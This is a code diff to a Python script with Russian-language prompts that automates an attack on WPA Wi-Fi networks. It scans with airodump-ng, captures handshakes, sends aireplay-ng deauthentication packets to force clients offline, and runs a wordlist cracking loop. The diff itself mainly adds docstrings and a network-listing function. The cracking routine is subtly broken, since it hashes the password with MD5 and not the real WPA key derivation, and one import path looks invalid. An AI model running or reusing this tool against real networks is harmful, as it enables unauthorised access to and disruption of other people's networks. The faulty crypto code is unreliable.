@@ -9,13 +9,19 @@ from pycryptodome.Util.Padding import pad
 from itertools import product
 import string
 
+
 def enable_monitor_mode(interface):
+    """Enable monitor mode on the wireless interface."""
     subprocess.run(["airmon-ng", "start", interface], check=True)
 
+
 def disable_monitor_mode(interface):
+    """Disable monitor mode on the wireless interface."""
     subprocess.run(["airmon-ng", "stop", interface], check=True)
 
+
 def capture_handshake(interface, target_bssid, output_file, channel, timeout):
+    """Capture WPA handshake using airodump-ng."""
     capture_process = subprocess.Popen([
         "airodump-ng",
         "--bssid", target_bssid,
@@ -38,7 +44,9 @@ def capture_handshake(interface, target_bssid, output_file, channel, timeout):
 
         time.sleep(1)
 
+
 def send_deauth_packets(interface, target_bssid, station_mac):
+    """Send deauth packets to disconnect a client and capture the handshake."""
     subprocess.run([
         "aireplay-ng",
         "--deauth", "10",
@@ -47,7 +55,9 @@ def send_deauth_packets(interface, target_bssid, station_mac):
         interface
     ], check=True)
 
+
 def wpa_hcrack(password, ssid, eapol):
+    """Crack WPA hash using the provided password and eapol."""
     key = password.encode("utf-8")
     
     hash1 = hashlib.md5(key).digest()
@@ -58,7 +68,9 @@ def wpa_hcrack(password, ssid, eapol):
 
     return encrypted
 
+
 def crack_password_from_hccapx(hccapx_file, wordlist, rate_limit):
+    """Attempt to crack WPA password using a wordlist."""
     with open(hccapx_file, "rb") as f:
         eapol = f.read()
 
@@ -75,15 +87,47 @@ def crack_password_from_hccapx(hccapx_file, wordlist, rate_limit):
             if counter >= rate:
                 time.sleep(1)
 
+
+def list_networks(interface):
+    """List available networks using airodump-ng."""
+    try:
+        # Run airodump-ng to scan networks in the background
+        process = subprocess.Popen(
+            ["airodump-ng", interface],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+
+        print("Сканирование сетей...\n")
+        print("Сканирование активных сетей в реальном времени:")
+
+        while True:
+            output = process.stdout.readline()
+            if output:
+                print(output.strip())  # Print available networks
+
+            # Exit on user input (Ctrl+C)
+            if not output:
+                break
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        print("\nСканирование остановлено.")
+        process.terminate()
+
+
 def main():
     interface = input("Введите имя беспроводного интерфейса: ").strip()
     enable_monitor_mode(interface)
 
     try:
-        time.sleep(2)
-        subprocess.run(["airodump-ng", interface], check=True)
+        list_networks(interface)
+
     except KeyboardInterrupt:
         print("\nСканирование завершено.")
+        disable_monitor_mode(interface)
+        sys.exit(0)
 
     target_bssid = input("Введите BSSID целевой сети: ").strip()
     channel = input("Введите канал сети: ").strip()
@@ -106,6 +150,7 @@ def main():
 
     disable_monitor_mode(interface)
     print(f"\nПерехват завершён. Проверьте файл: {captured_file}-01.cap")
+
 
 if __name__ == "__main__":
     try:
